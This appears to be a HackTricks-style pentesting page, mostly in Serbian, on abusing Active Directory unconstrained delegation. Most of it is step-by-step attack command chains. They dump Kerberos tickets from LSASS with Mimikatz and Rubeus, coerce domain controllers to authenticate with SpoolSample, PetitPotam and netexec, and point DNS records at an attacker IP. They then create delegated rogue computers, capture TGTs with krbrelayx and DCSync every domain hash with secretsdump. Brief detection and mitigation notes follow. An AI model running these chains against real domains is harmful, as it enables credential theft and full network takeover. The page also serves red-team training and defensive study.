# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Ovo je funkcija koju Domain Administrator može da postavi na bilo koji **Computer** unutar domena. Zatim, svaki put kada se **user logins** na Computer, **kopija TGT-a** tog korisnika će biti **poslata unutar TGS-a** koji obezbeđuje DC i **sačuvana u memoriji u LSASS-u**. Dakle, ako imate Administrator privilegije na mašini, moći ćete da **dump tickets i impersonate users** na bilo kojoj mašini.

Dakle, ako se domain admin prijavi na Computer sa aktiviranom funkcijom "Unconstrained Delegation", a vi imate local admin privilegije na toj mašini, moći ćete da dump ticket i impersonate Domain Admin bilo gde (domain privesc).

Možete **pronaći Computer objekte sa ovim atributom** tako što ćete proveriti da li atribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi LDAP filterom ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što je ono što powerview radi:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Učitaj ticket Administratora (ili žrtvinog korisnika) u memoriju pomoću **Mimikatz** ili **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Više informacija o Unconstrained delegation u ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Ako je napadač u mogućnosti da **kompromituje računar sa dozvoljenom "Unconstrained Delegation"**, mogao bi da **prevari** **Print server** da se **automatski prijavi** na njega **čuvajući TGT** u memoriji servera.\
Zatim bi napadač mogao da izvrši **Pass the Ticket attack da impersonira** korisnika računa računara Print servera.

Da bi naterao print server da se prijavi na bilo koju mašinu, možeš koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ako je TGT sa domain controller-a, možete da izvedete [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) i dobijete sve hash-eve sa DC-a.\
[**Više informacija o ovom attack-u na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Ovde pronađite druge načine da **prinudite autentifikaciju:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Svaki drugi coercion primitive koji navede žrtvu da se autentifikuje pomoću **Kerberos** ka vašem unconstrained-delegation host-u takođe radi. U modernim okruženjima to često znači zamenu klasičnog PrinterBug flow-a sa **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, ili coercion zasnovanim na **WebClient/WebDAV**, u zavisnosti od toga koji RPC surface je dostupan.

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation nije **ograničen samo na computer objects**. **User/service account** takođe može biti podešen kao `TRUSTED_FOR_DELEGATION`. U tom scenariju, praktičan uslov je da account mora da prima Kerberos service tickets za **SPN koji poseduje**.

To vodi do 2 veoma česta offensive pravca:

1. Kompromitujete password/hash unconstrained-delegation **user account-a**, zatim **dodate SPN** na isti taj account.
2. Account već ima jedan ili više SPN-ova, ali jedan od njih pokazuje na **zastareli/decommissioned hostname**; ponovno kreiranje nedostajućeg **DNS A record-a** je dovoljno da se hijakuje authentication flow bez menjanja SPN seta.

Minimalni Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- Ovo je posebno korisno kada je unconstrained principal **service account** i imate samo njegove kredencijale, a ne code execution na pridruženom hostu.
- Ako target korisnik već ima **stale SPN**, ponovno kreiranje odgovarajućeg **DNS record** može biti manje noisy nego upisivanje novog SPN-a u AD.
- Nedavni Linux-centric tradecraft koristi `addspn.py`, `dnstool.py`, `krbrelayx.py`, i jedan coercion primitive; ne morate da dodirnete Windows host da biste završili chain.

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domains često imaju `MachineAccountQuota > 0` (default 10), što omogućava bilo kom authenticated principal-u da kreira do N computer objects. Ako takođe imate `SeEnableDelegationPrivilege` token privilege (ili ekvivalentna prava), možete postaviti novo kreirani computer da bude trusted for unconstrained delegation i harvest inbound TGTs sa privileged systems.

High-level flow:

1) Kreirajte computer koji kontrolišete
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Učinite lažni hostname rešivim unutar domena
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Omogućite Unconstrained Delegation na računaru pod kontrolom napadača
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Zašto ovo radi: sa unconstrained delegation, LSA na računaru sa omogućenim delegation kešira dolazne TGT-ove. Ako prevarite DC ili privilegovani server da se autentifikuje na vaš fake host, njegov machine TGT će biti sačuvan i može biti izvezen.

4) Pokrenite krbrelayx u export modu i pripremite Kerberos materijal
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Iznudi autentifikaciju sa DC/servera na tvoj fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx će sačuvati ccache fajlove kada se mašina autentifikuje, na primer:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Iskoristite uhvaćeni DC machine TGT da biste izvršili DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Napomene i zahtevi:

- `MachineAccountQuota > 0` omogućava neprivilegovano kreiranje computer računa; inače su potrebna eksplicitna prava.
- Podešavanje `TRUSTED_FOR_DELEGATION` na computer zahteva `SeEnableDelegationPrivilege` (ili domain admin).
- Obezbedi name resolution do tvog fake host-a (DNS A record) tako da DC može da ga dosegne preko FQDN.
- Coercion zahteva izvodljiv vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, itd.). Ako je moguće, onemogući ove na DC-ovima.
- Ako je victim account označen kao **"Account is sensitive and cannot be delegated"** ili je član **Protected Users**, forwarded TGT neće biti uključen u service ticket, pa ovaj chain neće dati reusable TGT.
- Ako je **Credential Guard** omogućen na authenticating client/server, Windows blokira **Kerberos unconstrained delegation**, što može dovesti do toga da inače validni coercion path-ovi ne uspeju iz operator perspektive.

Ideje za detekciju i hardening:

- Alarm na Event ID 4741 (computer account created) i 4742/4738 (computer/user account changed) kada je UAC `TRUSTED_FOR_DELEGATION` postavljen.
- Prati neobične DNS A-record dodatke u domain zoni.
- Prati skokove u 4768/4769 sa neočekivanih hostova i DC-authentications ka non-DC hostovima.
- Ograniči `SeEnableDelegationPrivilege` na minimalan skup, postavi `MachineAccountQuota=0` gde je izvodljivo, i onemogući Print Spooler na DC-ovima. Primeni LDAP signing i channel binding.

### Mitigation

- Ograniči DA/Admin logine na specifične servise
- Postavi "Account is sensitive and cannot be delegated" za privilegovane naloge.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
